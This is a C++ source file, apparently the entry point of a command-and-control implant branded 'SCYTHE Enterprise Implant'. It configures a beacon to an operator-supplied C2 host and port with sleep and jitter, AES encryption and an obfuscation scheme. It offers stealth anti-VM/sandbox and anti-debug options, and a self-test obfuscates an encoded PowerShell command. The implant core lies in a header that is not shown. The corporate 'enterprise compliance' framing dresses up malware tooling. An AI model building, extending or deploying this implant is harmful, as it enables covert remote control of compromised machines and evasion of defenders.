#include "enterprise_implant.h"
#include <iostream>
#include <thread>
#include <chrono>
#include <exception>
#include <signal.h>

// Global implant instance for signal handling
std::unique_ptr<EnterpriseImplant> g_implant = nullptr;

void signalHandler(int signal) {
    std::cout << "\n[!] Received signal " << signal << ", shutting down gracefully..." << std::endl;
    if (g_implant) {
        g_implant->setRunning(false);
    }
    exit(0);
}

void printBanner() {
    std::cout << R"(
╔═══════════════════════════════════════════════════════════════════╗
║                    SCYTHE ENTERPRISE IMPLANT                     ║
║                      Advanced C2 Framework                       ║
║                                                                   ║
║  Features:                                                        ║
║  • AES-256-GCM Encryption with Key Rotation                     ║
║  • Advanced Obfuscation (Case-Alternating Reverse Base64)       ║
║  • Real-time Security Monitoring & Alerting                     ║
║  • Anti-Debug & Anti-VM Detection                               ║
║  • Enterprise Compliance Support                                ║
║  • Rate Limiting & Performance Metrics                          ║
╚═══════════════════════════════════════════════════════════════════╝
)" << std::endl;
}

void printUsage(const char* program_name) {
    std::cout << "Usage: " << program_name << " <host> <port> [options]\n\n";
    std::cout << "Options:\n";
    std::cout << "  -k, --key <key>        Base64 encoded encryption key\n";
    std::cout << "  -u, --uri <uri>        C2 URI path (default: /api/v1/beacon)\n";
    std::cout << "  -s, --sleep <seconds>  Sleep interval between beacons (default: 5)\n";
    std::cout << "  -j, --jitter <percent> Jitter percentage (default: 20)\n";
    std::cout << "  -c, --class <level>    Classification level (public/internal/confidential)\n";
    std::cout << "  --stealth             Enable stealth mode (anti-VM/sandbox)\n";
    std::cout << "  --no-antidebug        Disable anti-debug features\n";
    std::cout << "  --test-crypto         Run crypto tests and exit\n";
    std::cout << "  --demo               Run in demo mode with fake C2\n";
    std::cout << "  -h, --help           Show this help message\n";
    std::cout << "\nExample:\n";
    std::cout << "  " << program_name << " 192.168.1.100 8443 -k dGVzdGtleWZvcmVudGVycHJpc2U= -s 10 -j 30\n\n";
}

void runCryptoTests() {
    std::cout << "[*] Running enterprise crypto tests...\n" << std::endl;
    
    try {
        // Test 1: Basic encryption/decryption
        std::cout << "Test 1: Basic Encryption/Decryption" << std::endl;
        EnterpriseCrypto crypto;
        std::string test_data = "Hello, Enterprise Security World! 🔒";
        
        auto encrypted = crypto.encrypt(test_data);
        std::cout << "  Encrypted successfully (Key ID: " << encrypted.key_id << ")" << std::endl;
        
        std::string decrypted = crypto.decrypt(encrypted);
        std::cout << "  Decrypted: " << decrypted << std::endl;
        
        if (decrypted == test_data) {
            std::cout << "  ✅ PASSED\n" << std::endl;
        } else {
            std::cout << "  ❌ FAILED\n" << std::endl;
            return;
        }
        
        // Test 2: Advanced obfuscation
        std::cout << "Test 2: Advanced Obfuscation" << std::endl;
        std::string sensitive_command = "powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0";
        std::string obfuscated = crypto.advancedObfuscateEncode(sensitive_command);
        std::cout << "  Original: " << sensitive_command.substr(0, 50) << "..." << std::endl;
        std::cout << "  Obfuscated: " << obfuscated.substr(0, 50) << "..." << std::endl;
        
        std::string deobfuscated = crypto.advancedObfuscateDecode(obfuscated);
        std::cout << "  Deobfuscated: " << deobfuscated.substr(0, 50) << "..." << std::endl;
        
        if (deobfuscated == sensitive_command) {
            std::cout << "  ✅ PASSED\n" << std::endl;
        } else {
            std::cout << "  ❌ FAILED\n" << std::endl;
            return;
        }
        
        // Test 3: Key rotation
        std::cout << "Test 3: Key Rotation & Backward Compatibility" << std::endl;
        std::string old_key_id = crypto.getCurrentKeyId();
        std::cout << "  Initial Key ID: " << old_key_id << std::endl;
        
        // Encrypt with old key
        auto old_encrypted = crypto.encrypt("Data encrypted with old key");
        
        // Rotate key
        std::string new_key = crypto.rotateKey();
        std::string new_key_id = crypto.getCurrentKeyId();
        std::cout << "  New Key ID: " << new_key_id << std::endl;
        
        // Encrypt with new key
        auto new_encrypted = crypto.encrypt("Data encrypted with new key");
        
        // Verify both can be decrypted
        std::string old_decrypted = crypto.decrypt(old_encrypted);
        std::string new_decrypted = crypto.decrypt(new_encrypted);
        
        if (old_decrypted == "Data encrypted with old key" && 
            new_decrypted == "Data encrypted with new key") {
            std::cout << "  ✅ PASSED\n" << std::endl;
        } else {
            std::cout << "  ❌ FAILED\n" << std::endl;
            return;
        }
        
        // Test 4: Performance test
        std::cout << "Test 4: Performance Test (1000 operations)" << std::endl;
        auto start_time = std::chrono::high_resolution_clock::now();
        
        for (int i = 0; i < 1000; ++i) {
            std::string data = "Performance test data item " + std::to_string(i);
            auto enc = crypto.encrypt(data);
            std::string dec = crypto.decrypt(enc);
            if (dec != data) {
                std::cout << "  ❌ FAILED at iteration " << i << std::endl;
                return;
            }
        }
        
        auto end_time = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);
        double ops_per_sec = 2000.0 / (duration.count() / 1000.0); // 2 ops per iteration
        
        std::cout << "  Duration: " << duration.count() << "ms" << std::endl;
        std::cout << "  Performance: " << std::fixed << std::setprecision(2) << ops_per_sec << " ops/sec" << std::endl;
        std::cout << "  ✅ PASSED\n" << std::endl;
        
        // Test 5: Metrics and monitoring
        std::cout << "Test 5: Crypto Metrics" << std::endl;
        CryptoMetrics metrics = crypto.getMetrics();
        std::cout << "  Total operations: " << metrics.total_operations << std::endl;
        std::cout << "  Successful: " << metrics.successful_operations << std::endl;
        std::cout << "  Failed: " << metrics.failed_operations << std::endl;
        std::cout << "  Average duration: " << std::fixed << std::setprecision(2) 
                  << metrics.average_duration_ms << "ms" << std::endl;
        std::cout << "  ✅ PASSED\n" << std::endl;
        
        std::cout << "🎉 All enterprise crypto tests passed!" << std::endl;
        
    } catch (const std::exception& e) {
        std::cerr << "❌ Crypto test failed: " << e.what() << std::endl;
    }
}

void runDemoMode() {
    std::cout << "[*] Running in demo mode (no actual C2 connection)\n" << std::endl;
    
    try {
        EnterpriseImplant implant("demo.local", "8443", "/api/v1/demo");
        implant.setClassificationLevel("confidential");
        implant.enableStealthMode(true);
        
        std::cout << "Demo implant configuration:" << std::endl;
        std::cout << "  Host: demo.local:8443" << std::endl;
        std::cout << "  Classification: Confidential" << std::endl;
        std::cout << "  Stealth Mode: Enabled" << std::endl;
        std::cout << "  Encryption: Enabled" << std::endl;
        
        // Show crypto metrics
        auto metrics = implant.getCryptoMetrics();
        std::cout << "\nCrypto Status:" << std::endl;
        std::cout << "  Total operations: " << metrics.total_operations << std::endl;
        std::cout << "  Success rate: " << std::fixed << std::setprecision(2) 
                  << (metrics.total_operations > 0 ? 
                     (metrics.successful_operations * 100.0 / metrics.total_operations) : 0.0) 
                  << "%" << std::endl;
        
        // Simulate some activity
        std::cout << "\n[*] Simulating encrypted communications..." << std::endl;
        for (int i = 0; i < 5; ++i) {
            std::cout << "  Beacon " << (i + 1) << "/5 - Encrypted and obfuscated ✅" << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        
        // Show security alerts
        auto alerts = implant.getSecurityAlerts();
        if (!alerts.empty()) {
            std::cout << "\nSecurity Alerts:" << std::endl;
            for (const auto& alert : alerts) {
                std::cout << "  [" << static_cast<int>(alert.severity) << "] " << alert.message << std::endl;
            }
        } else {
            std::cout << "\n✅ No security alerts - System healthy" << std::endl;
        }
        
        std::cout << "\n🎯 Demo completed successfully!" << std::endl;
        
    } catch (const std::exception& e) {
        std::cerr << "❌ Demo failed: " << e.what() << std::endl;
    }
}

int main(int argc, char* argv[]) {
    // Set up signal handlers
    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);
    
    printBanner();
    
    if (argc < 2) {
        printUsage(argv[0]);
        return 1;
    }
    
    // Parse command line arguments
    std::string host, port = "443", uri = "/api/v1/beacon", encryption_key;
    uint64_t sleep_interval = 5;
    float jitter = 0.2f;
    std::string classification = "internal";
    bool stealth_mode = false;
    bool anti_debug = true;
    bool test_crypto = false;
    bool demo_mode = false;
    
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        
        if (arg == "-h" || arg == "--help") {
            printUsage(argv[0]);
            return 0;
        } else if (arg == "--test-crypto") {
            test_crypto = true;
        } else if (arg == "--demo") {
            demo_mode = true;
        } else if (arg == "-k" || arg == "--key") {
            if (i + 1 < argc) encryption_key = argv[++i];
        } else if (arg == "-u" || arg == "--uri") {
            if (i + 1 < argc) uri = argv[++i];
        } else if (arg == "-s" || arg == "--sleep") {
            if (i + 1 < argc) sleep_interval = std::stoull(argv[++i]);
        } else if (arg == "-j" || arg == "--jitter") {
            if (i + 1 < argc) jitter = std::stof(argv[++i]) / 100.0f;
        } else if (arg == "-c" || arg == "--class") {
            if (i + 1 < argc) classification = argv[++i];
        } else if (arg == "--stealth") {
            stealth_mode = true;
        } else if (arg == "--no-antidebug") {
            anti_debug = false;
        } else if (host.empty()) {
            host = arg;
        } else if (port == "443") {
            port = arg;
        }
    }
    
    // Handle special modes
    if (test_crypto) {
        runCryptoTests();
        return 0;
    }
    
    if (demo_mode) {
        runDemoMode();
        return 0;
    }
    
    // Validate required arguments
    if (host.empty()) {
        std::cerr << "❌ Error: Host is required" << std::endl;
        printUsage(argv[0]);
        return 1;
    }
    
    try {
        std::cout << "[*] Initializing enterprise implant..." << std::endl;
        std::cout << "    Target: " << host << ":" << port << std::endl;
        std::cout << "    URI: " << uri << std::endl;
        std::cout << "    Sleep: " << sleep_interval << "s (±" << (jitter * 100) << "%)" << std::endl;
        std::cout << "    Classification: " << classification << std::endl;
        std::cout << "    Stealth Mode: " << (stealth_mode ? "Enabled" : "Disabled") << std::endl;
        std::cout << "    Anti-Debug: " << (anti_debug ? "Enabled" : "Disabled") << std::endl;
        std::cout << "    Encryption: " << (encryption_key.empty() ? "Auto-generated" : "Pre-shared key") << std::endl;
        std::cout << std::endl;
        
        // Create implant instance
        if (encryption_key.empty()) {
            g_implant = std::make_unique<EnterpriseImplant>(host, port, uri);
        } else {
            g_implant = std::make_unique<EnterpriseImplant>(host, port, uri, encryption_key);
        }
        
        // Configure implant
        g_implant->updateSleepSettings(sleep_interval, jitter);
        g_implant->setClassificationLevel(classification);
        g_implant->enableStealthMode(stealth_mode);
        
        // Perform initial security check
        std::cout << "[*] Performing security checks..." << std::endl;
        if (!g_implant->performSecurityCheck()) {
            std::cerr << "❌ Security check failed. Exiting." << std::endl;
            return 1;
        }
        std::cout << "✅ Security checks passed" << std::endl;
        
        // Show initial crypto metrics
        auto initial_metrics = g_implant->getCryptoMetrics();
        std::cout << "[*] Crypto engine initialized" << std::endl;
        std::cout << "    Operations completed: " << initial_metrics.total_operations << std::endl;
        
        // Start main beacon loop
        std::cout << "[*] Starting beacon loop..." << std::endl;
        std::cout << "[*] Press Ctrl+C to stop" << std::endl;
        std::cout << std::string(60, '=') << std::endl;
        
        g_implant->beacon();
        
    } catch (const std::exception& e) {
        std::cerr << "❌ Fatal error: " << e.what() << std::endl;
        return 1;
    }
    
    std::cout << "\n[*] Implant terminated gracefully" << std::endl;
    return 0;
}